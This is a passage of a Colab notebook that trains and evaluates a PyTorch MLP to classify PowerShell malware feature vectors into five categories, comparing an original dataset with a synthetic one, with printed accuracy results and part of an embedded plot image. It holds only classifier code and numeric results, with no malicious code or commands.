        "import torch.optim as optim\n",
        "import pandas as pd\n",
        "import numpy as np\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import StandardScaler, LabelEncoder\n",
        "from sklearn.metrics import accuracy_score\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "# Load and preprocess dataset\n",
        "def load_and_preprocess_data(csv_path, feature_dim=512):\n",
        "    # Load CSV\n",
        "    data = pd.read_csv(csv_path)\n",
        "\n",
        "    # Define valid labels\n",
        "    valid_labels = {'Bypass', 'Downloader', 'Injector', 'Payload', 'TaskExecution'}\n",
        "\n",
        "    # Filter rows with valid labels\n",
        "    original_rows = len(data)\n",
        "    data = data[data['Label'].isin(valid_labels)]\n",
        "    removed_rows = original_rows - len(data)\n",
        "    if removed_rows > 0:\n",
        "        print(f\"{csv_path}: Removed {removed_rows} rows with invalid labels.\")\n",
        "\n",
        "    # Check if data is empty\n",
        "    if data.empty:\n",
        "        raise ValueError(f\"{csv_path}: No rows remain after filtering.\")\n",
        "\n",
        "    # Parse FusionVector\n",
        "    features = np.array([np.fromstring(vec, sep=' ') for vec in data['FusionVector']])\n",
        "\n",
        "    # Validate feature dimension\n",
        "    assert features.shape[1] == feature_dim, f\"{csv_path}: Expected {feature_dim} features, got {features.shape[1]}\"\n",
        "\n",
        "    # Encode labels\n",
        "    label_encoder = LabelEncoder()\n",
        "    labels = label_encoder.fit_transform(data['Label'])\n",
        "\n",
        "    # Normalize features\n",
        "    scaler = StandardScaler()\n",
        "    features = scaler.fit_transform(features)\n",
        "\n",
        "    # Convert to PyTorch tensors\n",
        "    features = torch.FloatTensor(features)\n",
        "    labels = torch.LongTensor(labels)\n",
        "\n",
        "    return features, labels, scaler, label_encoder\n",
        "\n",
        "# Simple MLP Model\n",
        "class MLP(nn.Module):\n",
        "    def __init__(self, input_dim, num_classes=5):\n",
        "        super(MLP, self).__init__()\n",
        "        self.model = nn.Sequential(\n",
        "            nn.Linear(input_dim, 128),\n",
        "            nn.ReLU(),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(128, 64),\n",
        "            nn.ReLU(),\n",
        "            nn.Dropout(0.3),\n",
        "            nn.Linear(64, num_classes)\n",
        "        )\n",
        "\n",
        "    def forward(self, x):\n",
        "        return self.model(x)\n",
        "\n",
        "# Train and evaluate model\n",
        "def train_and_evaluate(features, labels, dataset_name, test_size=0.2, epochs=50, batch_size=32, lr=0.001):\n",
        "    # Split data\n",
        "    try:\n",
        "        X_train, X_test, y_train, y_test = train_test_split(\n",
        "            features, labels, test_size=test_size, stratify=labels, random_state=42\n",
        "        )\n",
        "    except ValueError as e:\n",
        "        print(f\"{dataset_name}: Error in train_test_split: {e}\")\n",
        "        return None, None\n",
        "\n",
        "    # Initialize model\n",
        "    model = MLP(input_dim=512)\n",
        "    optimizer = optim.Adam(model.parameters(), lr=lr)\n",
        "    criterion = nn.CrossEntropyLoss()\n",
        "\n",
        "    # Training loop\n",
        "    model.train()\n",
        "    for epoch in range(epochs):\n",
        "        total_loss = 0\n",
        "        for i in range(0, len(X_train), batch_size):\n",
        "            batch_features = X_train[i:i+batch_size]\n",
        "            batch_labels = y_train[i:i+batch_size]\n",
        "\n",
        "            optimizer.zero_grad()\n",
        "            outputs = model(batch_features)\n",
        "            loss = criterion(outputs, batch_labels)\n",
        "            loss.backward()\n",
        "            optimizer.step()\n",
        "            total_loss += loss.item()\n",
        "\n",
        "        if (epoch + 1) % 10 == 0:\n",
        "            avg_loss = total_loss / (len(X_train) // batch_size + 1)\n",
        "            print(f\"{dataset_name}: Epoch {epoch+1}/{epochs}, Loss: {avg_loss:.4f}\")\n",
        "\n",
        "    # Evaluate\n",
        "    model.eval()\n",
        "    with torch.no_grad():\n",
        "        test_outputs = model(X_test)\n",
        "        test_loss = criterion(test_outputs, y_test).item()\n",
        "        test_preds = torch.argmax(test_outputs, dim=1)\n",
        "        test_accuracy = accuracy_score(y_test.numpy(), test_preds.numpy())\n",
        "\n",
        "    print(f\"{dataset_name}: Test Accuracy: {test_accuracy:.4f}, Test Loss: {test_loss:.4f}\")\n",
        "    return test_accuracy, test_loss\n",
        "\n",
        "# Visualize results\n",
        "def visualize_comparison(results):\n",
        "    datasets = ['Original (A)', 'Synthetic (B)']\n",
        "    accuracies = [results['A']['accuracy'], results['B']['accuracy']]\n",
        "    losses = [results['A']['loss'], results['B']['loss']]\n",
        "\n",
        "    x = np.arange(len(datasets))\n",
        "    width = 0.35\n",
        "\n",
        "    fig, ax = plt.subplots(figsize=(8, 6))\n",
        "    ax.bar(x - width/2, accuracies, width, label='Accuracy', color='skyblue')\n",
        "    ax.bar(x + width/2, losses, width, label='Loss', color='salmon')\n",
        "\n",
        "    ax.set_xlabel('Dataset')\n",
        "    ax.set_title('Model Performance: Original vs Synthetic Dataset')\n",
        "    ax.set_xticks(x)\n",
        "    ax.set_xticklabels(datasets)\n",
        "    ax.legend()\n",
        "\n",
        "    # Add value labels on bars\n",
        "    for i, v in enumerate(accuracies):\n",
        "        ax.text(i - width/2, v + 0.01, f\"{v:.3f}\", ha='center')\n",
        "    for i, v in enumerate(losses):\n",
        "        ax.text(i + width/2, v + 0.01, f\"{v:.3f}\", ha='center')\n",
        "\n",
        "    plt.tight_layout()\n",
        "    plt.savefig(\"dataset_comparison.png\")\n",
        "    plt.show()\n",
        "    print(\"Comparison plot saved as 'dataset_comparison.png'\")\n",
        "\n",
        "# Main execution\n",
        "if __name__ == \"__main__\":\n",
        "    # Paths to datasets\n",
        "    original_csv = \"/content/drive/MyDrive/GAN/fusion_with_vector_extended.csv\"  # Original dataset (Dataset A)\n",
        "    synthetic_csv = \"synthetic_powershell_malware.csv\"  # Synthetic dataset (Dataset B)\n",
        "\n",
        "    # Load and preprocess datasets\n",
        "    try:\n",
        "        features_a, labels_a, scaler_a, encoder_a = load_and_preprocess_data(original_csv)\n",
        "        print(\"Loaded original dataset (A)\")\n",
        "    except Exception as e:\n",
        "        print(f\"Error loading original dataset: {e}\")\n",
        "        exit(1)\n",
        "\n",
        "    try:\n",
        "        features_b, labels_b, scaler_b, encoder_b = load_and_preprocess_data(synthetic_csv)\n",
        "        print(\"Loaded synthetic dataset (B)\")\n",
        "    except Exception as e:\n",
        "        print(f\"Error loading synthetic dataset: {e}\")\n",
        "        exit(1)\n",
        "\n",
        "    # Train and evaluate on each dataset\n",
        "    results = {'A': {}, 'B': {}}\n",
        "\n",
        "    # Dataset A (Original)\n",
        "    result_a = train_and_evaluate(features_a, labels_a, \"Original Dataset (A)\")\n",
        "    if result_a[0] is not None:\n",
        "        results['A']['accuracy'], results['A']['loss'] = result_a\n",
        "    else:\n",
        "        print(\"Failed to evaluate Dataset A. Check dataset size or labels.\")\n",
        "        exit(1)\n",
        "\n",
        "    # Dataset B (Synthetic)\n",
        "    result_b = train_and_evaluate(features_b, labels_b, \"Synthetic Dataset (B)\")\n",
        "    if result_b[0] is not None:\n",
        "        results['B']['accuracy'], results['B']['loss'] = result_b\n",
        "    else:\n",
        "        print(\"Failed to evaluate Dataset B. Check dataset size or labels.\")\n",
        "        exit(1)\n",
        "\n",
        "    # Visualize results\n",
        "    visualize_comparison(results)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 897
        },
        "id": "vPqjCYWG7tm7",
        "outputId": "395505bf-b8b7-4cc9-9ffe-ae1cef25ea57"
      },
      "execution_count": 34,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/drive/MyDrive/GAN/fusion_with_vector_extended.csv: Removed 3 rows with invalid labels.\n",
            "Loaded original dataset (A)\n",
            "Loaded synthetic dataset (B)\n",
            "Original Dataset (A): Epoch 10/50, Loss: 0.0968\n",
            "Original Dataset (A): Epoch 20/50, Loss: 0.0645\n",
            "Original Dataset (A): Epoch 30/50, Loss: 0.0691\n",
            "Original Dataset (A): Epoch 40/50, Loss: 0.0479\n",
            "Original Dataset (A): Epoch 50/50, Loss: 0.0434\n",
            "Original Dataset (A): Test Accuracy: 0.9779, Test Loss: 0.1047\n",
            "Synthetic Dataset (B): Epoch 10/50, Loss: 1.5209\n",
            "Synthetic Dataset (B): Epoch 20/50, Loss: 1.3264\n",
            "Synthetic Dataset (B): Epoch 30/50, Loss: 1.1654\n",
            "Synthetic Dataset (B): Epoch 40/50, Loss: 1.0371\n",
            "Synthetic Dataset (B): Epoch 50/50, Loss: 0.9492\n",
            "Synthetic Dataset (B): Test Accuracy: 0.1863, Test Loss: 2.3891\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x600 with 1 Axes>"
            ],
            "image/png": "iVBORw0KGgoAAAANSUhEUgAAAxYAAAJOCAYAAAAqFJGJAAAAOnRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjEwLjAsIGh0dHBzOi8vbWF0cGxvdGxpYi5vcmcvlHJYcgAAAAlwSFlzAAAPYQAAD2EBqD+naQAAYI5JREFUeJzt3Xl8TNfj//H3JGQhWxEiRBLR2vddEWqJtbZa29pKtaWKalG1VTXa4mOnWkQttdRaW0uUUrpYUlWkqJ3YJSQkmPv7wy/zNZKQ5CLSvp6PxzyYc8+959yZycy855x7r8UwDEMAAAAAYIJDRncAAAAAQOZHsAAAAABgGsECAAAAgGkECwAAAACmESwAAAAAmEawAAAAAGAawQIAAACAaQQLAAAAAKYRLAAAAACYRrAAMhGLxaLhw4eneb1jx47JYrEoLCzskffJjLlz56pIkSLKmjWrvLy8Mro7SIWAgAB17tw5XevWqlVLtWrVeqT9ud/w4cNlsVgeaxuZVeJjc/Hixcfe1tP6ngPg8SJYAGkUFhYmi8Uii8Wibdu2JVluGIb8/PxksVjUpEmTDOhh+m3evNm2bxaLRVmzZlXBggXVsWNH/fPPP4+0rYMHD6pz584KCgrSl19+qRkzZjzS7eP/GIahuXPnqmbNmvLy8lK2bNlUsmRJffTRR4qNjc3o7v0rWa1Wff3116pcubJy5Mghd3d3Pffcc+rYsaN++eWXx9r2J598ohUrVjzWNhItWLBA48ePf6xtJIaUe9+XcuXKpWrVqumDDz7QiRMn0r3tM2fOaPjw4YqIiHh0HTZh7dq16frxCHhaZMnoDgCZlYuLixYsWKDq1avblW/ZskWnTp2Ss7NzBvXMvN69e6tixYq6deuWdu/erRkzZmjNmjX6888/5evr+0ja2Lx5s6xWqyZMmKBChQo9km0iqTt37qhDhw5avHixatSooeHDhytbtmzaunWrRowYoSVLlmjjxo3KkydPqrYXGRkpB4f0/Sb1ww8/pGu9zKh3796aMmWKmjVrppdffllZsmRRZGSk1q1bp4IFC6pKlSqPre1PPvlEL730kpo3b/7Y2ki0YMEC7du3T3369LEr9/f3140bN5Q1a9ZH1lb79u3VqFEjWa1WXblyRb///rvGjx+vCRMmaObMmWrXrl2at3nmzBmNGDFCAQEBKlOmzCPra3qtXbtWU6ZMIVwg0yJYAOnUqFEjLVmyRBMnTlSWLP/3p7RgwQKVL1/+iUw3eFxq1Kihl156SZLUpUsXPffcc+rdu7fmzJmjQYMGmdp2bGyssmfPrvPnz0vSI50CFRcXp2zZsj2y7f0bfPbZZ1q8eLH69++vzz//3Fb++uuvq02bNmrevLk6d+6sdevWpbgNwzB08+ZNubq6mgrMTk5O6V43Mzl37pymTp2q7t27JxmJGz9+vC5cuJBBPXtyLBaLXFxcHuk2y5Urp1deecWu7Pjx46pfv746deqkokWLqnTp0o+0TQBpw1QoIJ3at2+vS5cuacOGDbayhIQEffvtt+rQoUOy68TGxurdd9+Vn5+fnJ2dVbhwYY0ZM0aGYdjVi4+PV9++feXt7S13d3e9+OKLOnXqVLLbPH36tLp27ao8efLI2dlZxYsX16xZsx7djkp64YUXJElHjx61la1bt041atRQ9uzZ5e7ursaNG+uvv/6yW69z585yc3PTkSNH1KhRI7m7u+vll19WQECAhg0bJkny9vZOcuzI1KlTVbx4cTk7O8vX11c9e/bU1atX7bZdq1YtlShRQrt27VLNmjWVLVs2ffDBB7ZpE2PGjNGUKVNUsGBBZcuWTfXr19fJkydlGIZGjhyp/Pnzy9XVVc2aNdPly5fttr1y5Uo1btxYvr6+cnZ2VlBQkEaOHKk7d+4k24f9+/erdu3aypYtm/Lly6fPPvssyWN48+ZNDR8+XM8995xcXFyUN29etWzZUkeOHLHVsVqtGj9+vIoXLy4XFxflyZNHPXr00JUrV+y2FR0drYMHDyo6OvqBz9uNGzf0+eef67nnnlNoaGiS5U2bNlWnTp20fv16u+k5AQEBatKkib7//ntVqFBBrq6u+uKLL2zL7j/GYu/evQoODparq6vy58+vjz/+WLNnz5bFYtGxY8fsHq97j7FInHq3ePFijRo1Svnz55eLi4vq1Kmjw4cP27WxdetWtW7dWgUKFJCzs7P8/PzUt29f3bhx44GPQXJ69eolNzc3xcXFJVnWvn17+fj42J7rnTt3KiQkRLly5ZKrq6sCAwPVtWvXB27/6NGjMgxDzz//fJJlFotFuXPnliT9888/slgs+t///pek3vbt22WxWPTNN99I+r/jIw4fPqzOnTvLy8tLnp6e6tKli91+WCwWxcbGas6cObapQ/c/X1evXn3gNhLNmzdP5cuXl6urq3LkyKF27drp5MmTtuW1atXSmjVrdPz4cVtbAQEBklI+xuLgwYNq06aNvL295erqqsKFC2vw4MEPfDwfxN/fX2FhYUpISLD7u7t8+bL69++vkiVLys3NTR4eHmrYsKH++OMPW53NmzerYsWKku7+gJK4D4l9Tu1rLioqSl26dFH+/Pnl7OysvHnzqlmzZnavfenh75mdO3fWlClTJMlu6heQmTBiAaRTQECAqlatqm+++UYNGzaUdPeDIzo6Wu3atdPEiRPt6huGoRdffFE//vijXnvtNZUpU0bff/+93nvvPZ0+fdruy0W3bt00b948dejQQdWqVdOmTZvUuHHjJH04d+6cqlSpIovFol69esnb21vr1q3Ta6+9ppiYmCTTE9Ir8ctvzpw5Jd096LpTp04KCQnRp59+qri4OE2bNk3Vq1fXnj17bF8uJOn27dsKCQlR9erVNWbMGGXLlk2dO3fW119/reXLl2vatGlyc3NTqVKlJN39AjVixAjVrVtXb775piIjIzVt2jT9/vvv+vnnn+2mVly6dEkNGzZUu3bt9Morr9hN55k/f74SEhL09ttv6/Lly/rss8/Upk0bvfDCC9q8ebMGDBigw4cPa9KkSerfv79dGAsLC5Obm5v69esnNzc3bdq0SUOHDlVMTIzdr/6SdOXKFTVo0EAtW7ZUmzZt9O2332rAgAEqWbKk7XVx584dNWnSROHh4WrXrp3eeecdXbt2TRs2bNC+ffsUFBQkSerRo4fCwsLUpUsX9e7dW0ePHtXkyZO1Z88eu31fvny5unTpotmzZz/wQOpt27bpypUreuedd+xG1e7VsWNHzZ49W6tXr7abnhMZGan27durR48e6t69uwoXLpzs+qdPn1bt2rVlsVg0aNAgZc+eXV999VWaRjZGjx4tBwcH9e/fX9HR0frss8/08ssv69dff7XVWbJkieLi4vTmm28qZ86c+u233zRp0iSdOnVKS5YsSXVbktS2bVtNmTJFa9asUevWrW3lcXFx+u6779S5c2c5Ojrq/Pnzql+/vry9vTVw4EB5eXnp2LFjWrZs2QO37+/vb+tz69atUxxFK1iwoJ5//nnNnz9fffv2tVs2f/58ubu7q1mzZnblbdq0UWBgoEJDQ7V792599dVXyp07tz799FNJd/82u3XrpkqVKun111+XJNvrK7XbkKRRo0ZpyJAhatOmjbp166YLFy5o0qRJqlmzpvbs2SMvLy8NHjxY0dHROnXqlO39y83NLcXHZe/evapRo4ayZs2q119/XQEBATpy5Ii+++47jRo16oGP6YNUrVpVQUFBdj/y/PPPP1qxYoVat26twMBAnTt3Tl988YWCg4O1f/9++fr6qmjRovroo480dOhQvf7666pRo4YkqVq1apJS/5pr1aqV/vrrL7399tsKCAjQ+fPntWHDBp04ccL2Xpia98wePXrozJkz2rBhg+bOnZvuxwPIUAaANJk9e7Yhyfj999+NyZMnG+7u7kZcXJxhGIbRunVro3bt2oZhGIa/v7/RuHFj23orVqwwJBkff/yx3fZeeuklw2KxGIcPHzYMwzAiIiIMScZbb71lV69Dhw6GJGPYsGG2stdee83ImzevcfHiRbu67dq1Mzw9PW39Onr0qCHJmD179gP37ccffzQkGbNmzTIuXLhgnDlzxlizZo0REBBgWCwW4/fffzeuXbtmeHl5Gd27d7dbNyoqyvD09LQr79SpkyHJGDhwYJK2hg0bZkgyLly4YCs7f/684eTkZNSvX9+4c+eOrXzy5Mm2fiUKDg42JBnTp0+3227ivnp7extXr161lQ8aNMiQZJQuXdq4deuWrbx9+/aGk5OTcfPmTVtZ4uN2rx49ehjZsmWzq5fYh6+//tpWFh8fb/j4+BitWrWylc2aNcuQZIwbNy7Jdq1Wq2EYhrF161ZDkjF//ny75evXr09SnvgafNjzOX78eEOSsXz58hTrXL582ZBktGzZ0lbm7+9vSDLWr1+fpL6/v7/RqVMn2/23337bsFgsxp49e2xlly5dMnLkyGFIMo4ePWorDw4ONoKDg233E19vRYsWNeLj423lEyZMMCQZf/75p60sueckNDTUsFgsxvHjx21lia+rB7FarUa+fPnsniPDMIzFixcbkoyffvrJMAzDWL58ue1vPa06duxoSDKeeeYZo0WLFsaYMWOMAwcOJKn3xRdfGJLsliUkJBi5cuWye5wT96tr165267do0cLImTOnXVn27Nnt1k3rNo4dO2Y4Ojoao0aNsqv3559/GlmyZLErb9y4seHv75+kreTec2rWrGm4u7vbPV+G8X9/AylJ3Nbnn3+eYp1mzZoZkozo6GjDMAzj5s2bdu8hidtxdnY2PvroI1vZ77//nuLfUmpec1euXHlo39LyntmzZ8+Hvn6BpxlToQAT2rRpoxs3bmj16tW6du2aVq9eneI0qLVr18rR0VG9e/e2K3/33XdlGIZtjvvatWslKUm9+0cfDMPQ0qVL1bRpUxmGoYsXL9puISEhio6O1u7du9O1X127dpW3t7d8fX3VuHFj29SKChUqaMOGDbp69arat29v16ajo6MqV66sH3/8Mcn23nzzzVS1u3HjRiUkJKhPnz52Bwh3795dHh4eWrNmjV19Z2dndenSJdlttW7dWp6enrb7lStXliS98sordr/eV65cWQkJCTp9+rStzNXV1fb/a9eu6eLFi6pRo4bi4uJ08OBBu3bc3Nzs5n07OTmpUqVKdmfRWrp0qXLlyqW33347ST8TpzosWbJEnp6eqlevnt3jWr58ebm5udk9rp07d5ZhGA897eu1a9ckSe7u7inWSVwWExNjVx4YGKiQkJAHbl+S1q9fr6pVq9od+JojRw69/PLLD103UZcuXeyOv0j85fjex/De5yQ2NlYXL15UtWrVZBiG9uzZk+q2pLuPeevWrbV27Vpdv37dVr5o0SLly5fPdkKGxON/Vq9erVu3bqWpjdmzZ2vy5MkKDAzU8uXL1b9/fxUtWlR16tSxe621adNGLi4umj9/vq3s+++/18WLF5McTyBJb7zxht39GjVq6NKlS0mevwd52DaWLVsmq9WqNm3a2L0WfXx89Oyzzyb7N/4wFy5c0E8//aSuXbuqQIECdssexXSfxJGSxNe8s7Oz7T3kzp07unTpktzc3FS4cOFUvy+m5jXn6uoqJycnbd68OcmUxUTpec8EMiumQgEmeHt7q27dulqwYIHi4uJ0584d20HP9zt+/Lh8fX2TfMkrWrSobXnivw4ODkmmL9w/FeXChQu6evWqZsyYkeKpWhMPkE6roUOHqkaNGnJ0dFSuXLlUtGhR25fxQ4cOSfq/4y7u5+HhYXc/S5Ysyp8/f6raTXwM7t9XJycnFSxY0LY8Ub58+VI8IPj+Ly+JIcPPzy/Z8nu/FPz111/68MMPtWnTpiRf2O4/riF//vxJvhg988wz2rt3r+3+kSNHVLhw4RSnI0l3H9fo6Gjb/Pv7pee5THytJX7ZSk5K4SMwMDBVbRw/flxVq1ZNUp6WM33d/1w988wzkuyfkxMnTmjo0KFatWpVssecpFXbtm01fvx4rVq1Sh06dND169e1du1a9ejRw/Z8BgcHq1WrVhoxYoT+97//qVatWmrevLk6dOjw0KleDg4O6tmzp3r27KlLly7p559/1vTp07Vu3Tq1a9dOW7dulXQ3vDRt2lQLFizQyJEjJd2dBpUvX75k/8Ye9Fjd/7eXkodt49ChQzIMQ88++2yy66fnTE+JIbFEiRJpXjc1EgNi4us48YxzU6dO1dGjR+2Oj0qc0vkwqXnNOTs769NPP9W7776rPHnyqEqVKmrSpIk6duwoHx8fSWl/zwQyM4IFYFKHDh3UvXt3RUVFqWHDhk/sQm9Wq1XS3V/gO3XqlGydxOMW0qpkyZKqW7fuA9udO3eu7YPzXvd/eb73l8NH7d5fFO/n6OiYpnLj/x9Af/XqVQUHB8vDw0MfffSRgoKC5OLiot27d2vAgAG2/U/t9lLLarUqd+7cdr9c38vb2ztN25P+L7Tu3bs3xVOPJgagYsWK2ZU/6LF91B72GN65c0f16tXT5cuXNWDAABUpUkTZs2fX6dOn1blz5yTPSWpUqVJFAQEBWrx4sTp06KDvvvtON27cUNu2bW11LBaLvv32W/3yyy/67rvv9P3336tr164aO3asfvnllwceT3CvnDlz6sUXX9SLL76oWrVqacuWLTp+/LjtWIyOHTtqyZIl2r59u0qWLKlVq1bprbfeSvbv5lG83h62DavVKovFonXr1iVbN7X7/STt27dPuXPntn1J/+STTzRkyBB17dpVI0eOVI4cOeTg4KA+ffqk6vWSltdcnz591LRpU61YsULff/+9hgwZotDQUG3atElly5ZN83smkJnxagZMatGihXr06KFffvlFixYtSrGev7+/Nm7cqGvXrtn9Opw4tSbxS4a/v7+sVqvtV+5EkZGRdttLPGPUnTt3UgwBj0PiSEru3LkfebuJj0FkZKQKFixoK09ISNDRo0efyH5u3rxZly5d0rJly1SzZk1b+b1nxEqroKAg/frrr7p161aKv/YGBQVp48aNev755x/Zl/rq1avLy8tLCxYs0ODBg5P9kvj1119LUrov5ujv75/kDE6Ski1Lrz///FN///235syZo44dO9rK7z1YNz3atGmjCRMmKCYmRosWLVJAQECy15eoUqWKqlSpolGjRmnBggV6+eWXtXDhQnXr1i3NbVaoUEFb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